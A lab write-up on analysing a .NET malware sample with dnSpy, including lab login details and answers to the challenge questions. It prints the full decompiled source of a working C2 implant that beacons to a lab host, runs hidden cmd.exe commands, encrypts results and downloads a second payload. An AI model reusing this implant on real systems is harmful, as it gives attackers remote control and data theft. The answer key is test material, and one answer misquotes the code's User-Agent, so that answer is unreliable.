# Day_09 [Malware-Analysis] She sells C# shells by the C2shore

+ Deployable Machine: Yes
+ RDP: Yes
  + UN: analyst
  + PW: AoC2023!

Description: The drama unfolds as the Best Festival Company and AntarctiCrafts merger wraps up! Tracy McGreedy, now a grumpy regional manager, secretly plans sabotage. His sidekick, Van Sprinkles, hesitantly kicks off a cyber attack â€“ but guess what? Van Sprinkles is having second thoughts and helps McSkidy's team bust McGreedy's evil scheme!

> IP: [10.10.72.91]

## LEARNING OBJECTIVES

1. The foundations of analysing malware samples safely
2. The fundamentals of .NET binaries
3. The dnSpy tool for decompiling malware samples written in .NET
4. Building an essential methodology for analysing malware source code

## WARNING

1. Malware Handling 101
   1. Forensic McBlue.WARNING: Handling a malware sample is dangerous. Always take precautions during your analysis. 
   2. As mentioned, handling malware is dangerous because it is software explicitly designed to cause harm, steal information, or compromise the security and functionality of computer systems. Given this, we will again introduce the concept of malware sandboxing.
   3. A sandbox is like a pretend computer setup that acts like a real one. It's a safe place for experts to test malware and see how it behaves without any danger. Having a sandbox environment is essential when conducting malware analysis because it stops experts from running malware on their actual work computers, which could be risky and harmful.
   4. A typical environment setup of a malware sandbox contains the following:
      1. Network controls: Sandboxes often have network controls to limit and monitor the network traffic the malware generates. This also prevents the propagation of malware in any other assets.
      2. Virtualisation: Many sandboxes use technologies like VMware, VirtualBox, or Hyper-V to run the malware in a controlled, isolated environment. This allows for easy snapshots, resets, and disposal after the analysis.
      3. Monitoring and logging: Sandboxes record detailed logs of the malware's activities, including system interactions, network traffic, and file modification. These logs are invaluable for analysing and understanding the malware's behaviour.

## OVERVIEW

1. C2 Primer
   1. C2, or command and control, refers to a centralised system or infrastructure that malicious actors use to remotely manage and control compromised devices or systems. It serves as a channel through which attackers issue commands to compromised entities, enabling them to carry out various activities, such as data theft, surveillance, or further malware propagation.
2. Seeing C2 traffic means that malware has already been executed inside the victim machine, as detailed in the diagram above. In terms of cyber kill chain stages, the attacker has successfully crafted and delivered the malware to the target and potentially moves laterally inside the network to achieve its objectives.
   1. To expound further, malware with C2 capabilities typically exhibits the following behaviours:
   2. HTTP requests: C2 servers often communicate with compromised assets using HTTP(s) requests. These requests can be used to send commands or receive data.
   3. Command execution: This behaviour is the most common, allowing attackers to execute OS commands inside the machine.
   4. Sleep or delay: To evade detection and maintain stealth, threat actors typically instruct the running malware to enter a sleep or delay for a specific period. During this time, the malware won't do anything; it will only connect back to the C2 server once the timer completes.

## STEPS

1. Deploy Machine
2. RDP into machine
3. Use DNSPY to decomple the malware
4. DNSPY
   1. Open file
      1. > file -> open -> "Desktop -> artefacts -> JuicyTomaTOY_defanged"
   2. Explore file
      1. Entry point: JuicyTomatoy.Program.Main -> click on Main

         ```c#
            using System;
            using System.Diagnostics;
            using System.IO;
            using System.Linq;
            using System.Net;
            using System.Security.Cryptography;
            using System.Text;
            using System.Threading;

            namespace JuicyTomatoy
            {
               // Token: 0x02000002 RID: 2
               internal class Program
               {
                  // Token: 0x06000001 RID: 1 RVA: 0x00002048 File Offset: 0x00000248
                  private static void Main(string[] args)
                  {
                     string hostName = Dns.GetHostName();
                     string str = "http://mcgreedysecretc2.thm";
                     string url = str + "/reg";
                     string data = "name=" + hostName;
                     string str2 = Program.PostIt(url, data);
                     int count = 15000;
                     bool flag = false;
                     for (;;)
                     {
                        Program.Sleeper(count);
                        string url2 = str + "/tasks/" + str2;
                        string url3 = str + "/results/" + str2;
                        string it = Program.GetIt(url2);
                        if (!string.IsNullOrEmpty(it))
                        {
                           string[] array = Program.Decryptor(it).Split(new char[]
                           {
                              ' '
                           });
                           string a = array[0];
                           string text = "";
                           if (array.Length > 1)
                           {
                              text = string.Join(" ", array.Skip(1).ToArray<string>());
                           }
                           if (!(a == "sleep"))
                           {
                              if (!(a == "shell"))
                              {
                                 if (!(a == "implant"))
                                 {
                                    if (a == "quit")
                                    {
                                       flag = true;
                                    }
                                 }
                                 else
                                 {
                                    string text2 = Program.Implant("http://stash.mcgreedy.thm/spykit.exe");
                                    if (!string.IsNullOrEmpty(text2))
                                    {
                                       string str3 = Program.Encryptor(text2);
                                       string data2 = "result=" + str3;
                                       Program.PostIt(url3, data2);
                                    }
                                 }
                              }
                              else
                              {
                                 string str4 = Program.Encryptor(Program.ExecuteCommand(text));
                                 string data3 = "result=" + str4;
                                 Program.PostIt(url3, data3);
                              }
                           }
                           else
                           {
                              count = int.Parse(text) * 1000;
                           }
                           if (flag)
                           {
                              break;
                           }
                        }
                     }
                  }

                  // Token: 0x06000002 RID: 2 RVA: 0x000021BC File Offset: 0x000003BC
                  public static string Implant(string url)
                  {
                     byte[] bytes = Convert.FromBase64String(Program.GetIt(url));
                     string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\spykit.exe";
                     File.WriteAllBytes(text, bytes);
                     if (File.Exists(text))
                     {
                        return text;
                     }
                     return "";
                  }

                  // Token: 0x06000003 RID: 3 RVA: 0x000021FD File Offset: 0x000003FD
                  public static void Sleeper(int count)
                  {
                     Thread.Sleep(count);
                  }

                  // Token: 0x06000004 RID: 4 RVA: 0x00002208 File Offset: 0x00000408
                  private static string Encryptor(string plaintext)
                  {
                     byte[] bytes = Encoding.ASCII.GetBytes("youcanthackthissupersecurec2keys");
                     byte[] rgbIV = new byte[]
                     {
                        9,
                        178,
                        251,
                        121,
                        16,
                        203,
                        49,
                        218,
                        17,
                        5,
                        243,
                        70,
                        230,
                        214,
                        12,
                        216
                     };
                     byte[] inArray;
                     using (AesManaged aesManaged = new AesManaged())
                     {
                        aesManaged.Mode = CipherMode.CBC;
                        aesManaged.Padding = PaddingMode.Zeros;
                        aesManaged.BlockSize = 128;
                        aesManaged.KeySize = 256;
                        ICryptoTransform transform = aesManaged.CreateEncryptor(bytes, rgbIV);
                        using (MemoryStream memoryStream = new MemoryStream())
                        {
                           using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
                           {
                              using (StreamWriter streamWriter = new StreamWriter(cryptoStream))
                              {
                                 streamWriter.Write(plaintext);
                              }
                              inArray = memoryStream.ToArray();
                           }
                        }
                     }
                     return Convert.ToBase64String(inArray);
                  }

                  // Token: 0x06000005 RID: 5 RVA: 0x00002304 File Offset: 0x00000504
                  private static string Decryptor(string encoded)
                  {
                     byte[] buffer = Convert.FromBase64String(encoded);
                     byte[] bytes = Encoding.UTF8.GetBytes("youcanthackthissupersecurec2keys");
                     byte[] rgbIV = new byte[]
                     {
                        9,
                        178,
                        251,
                        121,
                        16,
                        203,
                        49,
                        218,
                        17,
                        5,
                        243,
                        70,
                        230,
                        214,
                        12,
                        216
                     };
                     string result = null;
                     using (AesManaged aesManaged = new AesManaged())
                     {
                        aesManaged.Mode = CipherMode.CBC;
                        aesManaged.Padding = PaddingMode.Zeros;
                        aesManaged.BlockSize = 128;
                        aesManaged.KeySize = 256;
                        ICryptoTransform transform = aesManaged.CreateDecryptor(bytes, rgbIV);
                        using (MemoryStream memoryStream = new MemoryStream(buffer))
                        {
                           using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
                           {
                              using (StreamReader streamReader = new StreamReader(cryptoStream))
                              {
                                 result = streamReader.ReadToEnd().Trim(new char[1]);
                              }
                           }
                        }
                     }
                     return result;
                  }

                  // Token: 0x06000006 RID: 6 RVA: 0x00002410 File Offset: 0x00000610
                  public static string ExecuteCommand(string command)
                  {
                     Process process = new Process();
                     process.StartInfo = new ProcessStartInfo
                     {
                        WindowStyle = ProcessWindowStyle.Hidden,
                        FileName = "cmd.exe",
                        Arguments = "/C " + command
                     };
                     process.StartInfo.UseShellExecute = false;
                     process.StartInfo.RedirectStandardOutput = true;
                     process.Start();
                     process.WaitForExit();
                     return process.StandardOutput.ReadToEnd();
                  }

                  // Token: 0x06000007 RID: 7 RVA: 0x00002481 File Offset: 0x00000681
                  public static string GetIt(string url)
                  {
                     HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
                     httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15";
                     return new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream()).ReadToEnd();
                  }

                  // Token: 0x06000008 RID: 8 RVA: 0x000024B4 File Offset: 0x000006B4
                  public static string PostIt(string url, string data)
                  {
                     HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
                     byte[] bytes = Encoding.ASCII.GetBytes(data);
                     httpWebRequest.Method = "POST";
                     httpWebRequest.ContentType = "application/x-www-form-urlencoded";
                     httpWebRequest.ContentLength = (long)bytes.Length;
                     httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15";
                     using (Stream requestStream = httpWebRequest.GetRequestStream())
                     {
                        requestStream.Write(bytes, 0, bytes.Length);
                     }
                     return new StreamReader(((HttpWebResponse)httpWebRequest.GetResponse()).GetResponseStream()).ReadToEnd();
                  }
               }
            }
         ```

         1. In here we see several important pieces
5. CODE REVIEW
   1. GetIT() function
      1. In here we see:
         1. httpWebRequest.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
            1. So UserAgent is `Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15`
   2. PostIt() function
      1. In here we see:
         1. httpWebRequest.Method = "POST";
            1. So HTTP method is `POST`
   3. Encryptor() function
      1. In here we see:
         1. byte[] bytes = Encoding.ASCII.GetBytes("youcanthackthissupersecurec2keys");
            1. So key is `youcanthackthissupersecurec2keys`
   4. Main() function
      1. In here we see:
         1. string str = "http://mcgreedysecretc2.thm";
         2. string url = str + "/reg";
            1. So the full url: `http://mcgreedysecretc2.thm/reg`
   5. Sleeper() function
      1. In here we see:
         1. Thread.Sleep(count);
         2. int count = 15000;
            1. So the sleep is for `15` seconds
   6. Main() function
      1. In here we see the ExecuteCommand() function called **IF** `(!(a == "shell"))`
         1. So the C2 command is `shell`
   7. Main() function
      1. In here we see:
         1. string text2 = Program.Implant("http://stash.mcgreedy.thm/spykit.exe");
         2. This looks to be the domain `stash.mcgreedy.thm` to download the spykit.exe

## QUESTIONS

1. What HTTP User-Agent was used by the malware for its connection requests to the C2 server?
   1. `Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.15`
2. What is the HTTP method used to submit the command execution output?
   1. `POST`
3. What key is used by the malware to encrypt or decrypt the C2 data?
   1. `youcanthackthissupersecurec2keys`
4. What is the first HTTP URL used by the malware?
   1. `http://mcgreedysecretc2.thm/reg`
5. How many seconds is the hardcoded value used by the sleep function?
   1. `15`
6. What is the C2 command the attacker uses to execute commands via cmd.exe?
   1. `shell`
7. What is the domain used by the malware to download another binary?
   1. `stash.mcgreedy.thm`